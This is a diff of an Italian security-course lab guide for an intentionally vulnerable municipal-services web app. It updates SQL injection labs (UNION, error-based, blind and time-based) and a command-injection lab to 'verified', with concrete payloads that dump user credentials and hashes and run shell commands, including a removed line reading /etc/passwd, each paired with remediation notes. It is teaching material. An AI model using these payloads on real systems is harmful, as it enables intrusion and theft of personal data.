@@ -476,67 +476,67 @@ nell'URL. `alert()` può essere bloccato: verifica scrivendo nel DOM.
 è superficie d'attacco.
 
 **Stato:** provato il 20 novembre 2026 con Playwright.
-## L11 — UNION e information disclosure `[progetto]`
+## L11 — Iniezione SQL con UNION `[verificato]`
 
-**Prerequisiti:** account **funzionario** (la ricerca pratiche è nello sportello).
-
-**Passi**
-
-1. Individua il numero di colonne: `?cf=' ORDER BY 6-- -` (nessun errore) e `ORDER BY 7-- -`
-   (errore).
-2. `?cf=' UNION SELECT 1,2,3,4,5,6-- -` → quali numeri compaiono in pagina? Quelli sono le
-   colonne renderizzate.
-3. Sostituisci con `codice_fiscale, nome, cognome, email, password, ruolo FROM utenti` →
-   dump degli hash.
-4. `?sort=id,` → errore SQL in pagina con la query completa.
-
-**Cosa osservare:** il passo 4 è la tecnica più realistica: l'iniezione su un **identificatore**
-(`ORDER BY`) non è parametrizzabile nemmeno con i prepared statement, e qui l'errore racconta
-lo schema.
-
-**Rimedio da spiegare:** valori → parametri; identificatori → whitelist esplicita; errori
-dettagliati solo in sviluppo.
-
-## L12 — Blind e time-based `[progetto]`
-
-**Prerequisiti:** nessuno (l'endpoint di verifica è pubblico).
+**Prerequisiti:** sessione dello sportello (L22 per la fissa, o le credenziali di Giulia).
 
 **Passi**
 
-1. `?protocollo=2025/0001234` → "Pratica in lavorazione".
-2. `?protocollo=9999' AND '1'='1` → ancora "in lavorazione" (vero).
-3. `?protocollo=9999' AND '1'='2` → "Protocollo non trovato" (falso).
-4. `?protocollo=9999' OR SLEEP(3)-- -` → la risposta arriva dopo tre secondi.
+1. `GET /sportello/pratiche` → le proprie pratiche, cinque colonne visibili, sei nella query.
+2. `?cf=' UNION SELECT codice_fiscale,email,password,'2025-01-01',ruolo,1 FROM utenti LIMIT 3#`
+   → codici fiscali, email e hash MD5.
+3. `?sort=extractvalue(1,concat(0x7e,(SELECT password FROM utenti WHERE id=1)))#` → errore XPATH
+   con l'hash dentro.
 
-**Cosa osservare:** il passo 3 è la macchina binaria: una condizione vera/falsa. Il passo 4 non
-richiede che la risposta cambi, solo che arrivi tardi — e regge anche quando il messaggio è
-sempre identico.
+**Cosa osservare:** l'UNION deve avere sei colonne, e la quarta è una data: i tipi vanno
+rispettati. Il numero di colonne si trova con `ORDER BY 1..7`.
 
-**Se non funziona:** con `AND SLEEP()` su una riga che non esiste il ritardo non si vede:
-serve `OR SLEEP()`.
+**Trappola:** `#` commenta solo fino a fine riga. Qui la query è su una riga sola, quindi
+funziona; su query multi-riga serve `/*`.
 
-**Rimedio da spiegare:** query parametriche; il tempo di risposta è un canale come un altro.
+**Rimedio da spiegare:** prepared statement con `cf` legato, e `sort` scelto da una lista bianca.
 
-## L13 — Command injection `[progetto]`
+**Stato:** provato il 20 novembre 2026.
+## L12 — Iniezione SQL cieca e a tempo `[verificato]`
 
-**Prerequisiti:** funzionario.
+**Prerequisiti:** nessuno (rotta pubblica).
 
 **Passi**
 
-1. Genera il PDF di una pratica: `POST /sportello/report` con `{"pratica": 118}`.
-2. Prova `{"pratica": "118;id"}` → l'output del comando compare nel messaggio di errore.
-3. `"118;cat /etc/passwd"` per convincersene.
+1. `GET /sportello/verifica?protocollo=2025/004102` → «risulta in_lavorazione».
+2. `?protocollo=2025/004102' AND '1'='2` → «Nessuna pratica».
+3. `?protocollo=2025/004102' AND SLEEP(3)#` → la risposta arriva dopo 3 secondi.
+4. Estrazione: `AND SUBSTRING((SELECT password FROM utenti WHERE id=1),1,1)='5'`.
 
-**Cosa osservare:** il convertitore è invocato con `exec()` e gli argomenti sono concatenati.
-È il classico difetto di un'integrazione scritta in fretta.
+**Cosa osservare:** il canale è il tempo, non il corpo della pagina. La rotta non richiede
+sessione: chiunque può interrogarla.
 
-**Rimedio da spiegare:** niente shell; API della libreria; se serve la shell, array di argomenti
-e valori validati.
+**Trappola importante:** `' OR SLEEP(3)#` cancella il `LIMIT 1` con il commento, quindi `SLEEP`
+gira per ogni riga e la richiesta dura mezz'ora. La forma corretta è `AND SLEEP(3)`.
 
----
+**Rimedio da spiegare:** prepared statement, messaggi d'errore generici, rate limit anche sulle
+rotte pubbliche.
 
-# Capitolo 6 — Soldi e perimetro
+**Stato:** provato il 20 novembre 2026 (3,0 s misurati).
+## L13 — Iniezione di comandi `[verificato]`
 
+**Prerequisiti:** sessione di un funzionario sullo sportello (L17).
+
+**Passi**
+
+1. `GET /sportello/report?dal=2025-01-01&al=2025-12-31` → il report.
+2. `?al=2025-12-31; id` → `uid=33(www-data)` dentro la pagina.
+
+**Cosa osservare:** il comando viene eseguito con `2>&1`, quindi anche gli errori tornano nella
+pagina: è il primo posto in cui guardare quando «non funziona».
+
+**Trappola:** con un account cittadino la pagina risponde «riservata al personale»; non è un
+guasto, è il controllo di ruolo.
+
+**Rimedio da spiegare:** eliminare `shell_exec` e generare il report in PHP, oppure usare
+`escapeshellarg` e un eseguibile che non interpreti altro.
+
+**Stato:** provato il 20 novembre 2026.
 ## L18 — Race condition sul rimborso `[progetto]`
 
 **Prerequisiti:** account cittadino con un rimborso in stato richiedibile.
@@ -648,9 +648,9 @@ entrare la classe: un lab che non funziona in aula costa più di uno che non c'�
 | L08 | MD5 | `[verificato]` |
 | L09 | Segreti e token | `[verificato]` |
 | L10 | SQLi login | `[verificato]` |
-| L11 | UNION + error-based | `[progetto]` |
-| L12 | Blind + time-based | `[progetto]` |
-| L13 | Command injection | `[progetto]` |
+| L11 | UNION + error-based | `[verificato]` |
+| L12 | Blind + time-based | `[verificato]` |
+| L13 | Command injection | `[verificato]` |
 | L14 | XSS riflesso | `[verificato]` |
 | L15 | XSS stored + furto token | `[verificato]` |
 | L16 | XSS DOM | `[verificato]` |
